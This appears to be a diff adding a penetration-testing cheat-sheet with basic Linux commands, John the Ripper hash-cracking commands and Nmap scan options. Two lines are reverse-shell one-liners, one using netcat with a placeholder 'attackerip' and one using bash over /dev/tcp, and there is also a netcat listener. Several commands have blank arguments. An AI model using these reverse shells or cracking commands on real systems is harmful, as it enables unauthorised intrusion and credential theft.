@@ -1,0 +1,28 @@
+Cheat-sheet: Useful Commands
+
+Common Linux Commands
+
+	Commands									Usage
+	passwd										Change password
+	python3 -m http.server $port				Start a python http server
+	screen –S (CTRL+A+D to background)			Start a new screen
+	screen –r $name								Retrieve a screen session
+	curl -X <http_method> http://website/url	Curl Basic
+	wget http[s]://website/url					Download a file
+	for i in $(); do echo -n "$i"; done			For loop
+	for i in {1..X}; do echo $i; done			For loop over number 1—X
+	nc –lnvp									Netcat listener
+	nc -e /bin/sh attackerip					Throw a reverse Shell
+	bash -i >& /dev/tcp// 0>&1					Throw a reverse Shell
+	john --format= --w=							Hash Cracking with John
+	john --format= --show						Show the cracked hashes
+
+
+
+Nmap Commands
+	Commands																			Usage
+	nmap -A –p0-65535 -nvvv [host]	Full Port, no DNS, OS, version detection & basic 	scripts verbose
+	nmap -iL -oA [host]																	Input and output files
+	nmap -sU -nvvv [host]																UDP Scanning
+	nmap -6 -sU -p161 -iL --open -Pn –nvv												IPv6 Scanning specific port
+	nmap -p88 --script= --script-args													Nmap scripts with arguments
